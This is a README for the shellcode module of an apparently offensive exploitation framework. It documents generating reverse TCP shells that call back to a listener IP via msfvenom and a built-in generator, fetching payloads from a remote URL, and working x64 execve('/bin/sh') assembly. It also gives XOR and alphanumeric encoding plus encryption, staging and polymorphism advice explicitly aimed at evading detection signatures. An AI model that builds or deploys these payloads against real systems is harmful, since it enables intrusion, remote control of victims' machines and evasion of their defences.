# Shellcode Data and Connectors

This directory contains platform-specific shellcode source files, compilation tools, and connector examples for generating and managing shellcode payloads.

## Directory Structure

```
shellcode/
├── connectors/           # Shellcode connector implementations
│   ├── base.py          # Base connector class
│   ├── example_connector.py  # Example custom connector
│   ├── msfvenom.py      # Metasploit Framework integration
│   └── remote.py        # Remote shellcode fetching
├── linux/               # Linux x86 shellcode sources
│   ├── src/            # Assembly source files
│   ├── compile.sh      # Build script
│   └── Dockerfile      # Build environment
├── linux/x64/          # Linux x86_64 shellcode sources
├── windows/            # Windows x86 shellcode sources
├── windows/x64/        # Windows x86_64 shellcode sources
└── java/               # Java-based payloads
```

## Platform-Specific Shellcode

### Linux x86

Binary shellcode for 32-bit Linux systems:
- `bind_tcp.asm` - Bind shell listening on port
- `reverse_tcp.asm` - Reverse shell connecting back

**Compile:**
```bash
cd linux
./compile.sh
```

### Linux x64

Binary shellcode for 64-bit Linux systems with the same capabilities as x86 but optimized for 64-bit architecture.

**Compile:**
```bash
cd linux/x64
./compile.sh
```

### Windows x86 / x64

Binary shellcode for Windows systems supporting both 32-bit and 64-bit architectures.

**Compile:**
```bash
cd windows        # or windows/x64
./compile.sh
```

### Java

Cross-platform Java-based reverse TCP payloads that work on any system with JVM.

## Shellcode Connectors

### Base Connector

The `base.py` module provides the `ShellcodeConnector` base class for creating custom shellcode generators:

```python
from ofx.data.shellcode.connectors.base import ShellcodeConnector

class MyShellcode(ShellcodeConnector):
    def __init__(self):
        super().__init__(
            os_target="linux",
            arch="x64"
        )
    
    def generate(self) -> bytes:
        """Generate shellcode bytes"""
        # Your generation logic
        return shellcode_bytes
```

### Metasploit Integration

Use `msfvenom.py` to generate shellcode using Metasploit Framework:

```python
from ofx.data.shellcode.connectors.msfvenom import MsfvenomConnector

connector = MsfvenomConnector(
    payload="linux/x64/shell_reverse_tcp",
    lhost="10.0.0.1",
    lport=4444
)
shellcode = connector.generate()
```

### Example Connector

The `example_connector.py` shows how to create a custom connector that:
- Loads shellcode from local files
- Applies encoding/obfuscation
- Formats output for different languages (C, Python, etc.)

### Remote Connector

Fetch shellcode from remote sources:

```python
from ofx.data.shellcode.connectors.remote import RemoteShellcodeConnector

connector = RemoteShellcodeConnector(
    url="https://example.com/shellcode.bin"
)
shellcode = connector.fetch()
```

## Using Shellcode in Workflows

### Basic Usage

```yaml
name: Generate Shellcode
jobs:
  create_payload:
    steps:
      - name: Generate reverse shell
        script: |
          from ofx.api.shellcode import ShellGenerator
          
          gen = ShellGenerator('linux', 'x64')
          shellcode, length = gen.get_shellcode(
              shellcode_type='reverse',
              connectback_ip='10.0.0.1',
              connectback_port=4444
          )
          
          print(f"Generated {length} bytes")
          print(shellcode.hex())
```

### With Custom Connector

```yaml
name: Custom Shellcode Generation
jobs:
  generate:
    steps:
      - name: Load custom shellcode
        script: |
          from ofx.data.shellcode.connectors.base import ShellcodeConnector
          
          connector = ShellcodeConnector(
              os_target='windows',
              arch='x64'
          )
          
          # Add custom processing
          raw_bytes = connector.load_from_file('payload.bin')
          encoded = connector.encode_xor(raw_bytes, key=0x42)
          
          print(encoded.hex())
```

## Encoding and Obfuscation

Most connectors support various encoding methods to avoid detection:

- **XOR Encoding** - Simple byte-wise XOR with key
- **Alphanumeric Encoding** - Convert to alphanumeric characters only
- **Base64 Encoding** - Standard Base64 encoding
- **Custom Encoders** - Implement your own encoding schemes

Example:
```python
from ofx.api.shellcode.encoder import encode_xor, encode_alpha

# XOR encoding
encoded = encode_xor(shellcode, key=0xAA)

# Alphanumeric encoding
alpha_shellcode = encode_alpha(shellcode)
```

## Output Formats

Shellcode can be formatted for different programming languages:

```python
# C/C++ format
print(connector.format_c(shellcode))
# unsigned char shellcode[] = "\x31\xc0\x50...";

# Python format
print(connector.format_python(shellcode))
# shellcode = b"\x31\xc0\x50..."

# JavaScript format
print(connector.format_javascript(shellcode))
# var shellcode = [0x31, 0xc0, 0x50, ...];
```

## Building Custom Shellcode

### Writing Assembly

1. Create `.asm` file in appropriate architecture directory
2. Use NASM syntax for Linux, MASM/NASM for Windows
3. Keep shellcode position-independent (no absolute addresses)
4. Avoid null bytes and bad characters

Example (Linux x64 execve):
```asm
; execve("/bin/sh", NULL, NULL)
xor rax, rax
push rax
mov rdi, 0x68732f6e69622f2f  ; "//bin/sh"
push rdi
mov rdi, rsp
xor rsi, rsi
xor rdx, rdx
mov al, 59
syscall
```

### Compiling

Use the provided compilation scripts or Docker containers:

```bash
# Using compile.sh
cd linux/x64
./compile.sh src/my_shellcode.asm

# Using Docker (for consistent environment)
docker build -t shellcode-builder .
docker run --rm -v $(pwd):/work shellcode-builder
```

### Testing Shellcode

Always test in a safe, isolated environment:

```python
from ofx.api.shellcode import test_shellcode

# Test if shellcode executes without crashing
result = test_shellcode(
    shellcode=your_shellcode,
    timeout=5,
    sandbox=True  # Use sandboxed environment
)
```

## Best Practices

### Security
1. **Test in VMs** - Never test shellcode on production systems
2. **Avoid Bad Chars** - Check for null bytes, newlines, etc.
3. **Size Optimization** - Minimize shellcode size for exploit constraints
4. **Encoding** - Use appropriate encoding for target environment

### Development
1. **Document Shellcode** - Comment assembly code thoroughly
2. **Version Control** - Track changes to shellcode sources
3. **Build Automation** - Use compilation scripts
4. **Portability** - Test on target platforms

### Operational
1. **Customization** - Modify IP/port at generation time
2. **Encryption** - Consider encrypting shellcode for evasion
3. **Staging** - Use stagers for large payloads
4. **Polymorphism** - Generate unique instances to avoid signatures

## Creating Custom Connectors

To create your own shellcode connector:

1. **Extend Base Class:**
```python
from ofx.data.shellcode.connectors.base import ShellcodeConnector

class MyCustomConnector(ShellcodeConnector):
    def __init__(self, custom_param):
        super().__init__(os_target="linux", arch="x64")
        self.custom_param = custom_param
    
    def generate(self) -> bytes:
        # Your custom generation logic
        shellcode = self._build_payload()
        return self.encode(shellcode)
```

2. **Implement Required Methods:**
   - `generate()` - Main shellcode generation
   - `encode()` - Optional encoding (can use base class)
   - `format()` - Optional output formatting

3. **Register Your Connector:**
Place in `connectors/` directory with descriptive name: `my_connector.py`

## Troubleshooting

### Compilation Errors

**Issue:** NASM not found
```bash
# Install NASM
sudo apt-get install nasm  # Ubuntu/Debian
brew install nasm          # macOS
```

**Issue:** Linker errors
- Ensure using correct architecture flags
- Check for undefined symbols
- Verify assembly syntax

### Runtime Errors

**Issue:** Shellcode crashes immediately
- Check for bad characters (null bytes)
- Verify registers are properly initialized
- Test in debugger (gdb, radare2)

**Issue:** Shellcode doesn't execute expected action
- Verify syscall numbers for target OS
- Check function parameters
- Ensure proper stack alignment

## See Also

- [Shellcode API Documentation](../../docs/api/exploitation/shellcode.md)
- [Developing Connectors Guide](../../docs/guide/developing-connectors.md)
- [Exploitation API Overview](../../docs/api/exploitation.md)
- [Workflow Integration](../../docs/guide/workflows.md)

## Resources

- **Shellcode Database:** [Shell-Storm](http://shell-storm.org/shellcode/)
- **Assembly References:** [NASM Documentation](https://www.nasm.us/docs.php)
- **System Calls:** [Linux Syscalls](https://syscalls.kernelgrok.com/)
- **Windows APIs:** [MSDN API Reference](https://docs.microsoft.com/en-us/windows/win32/api/)
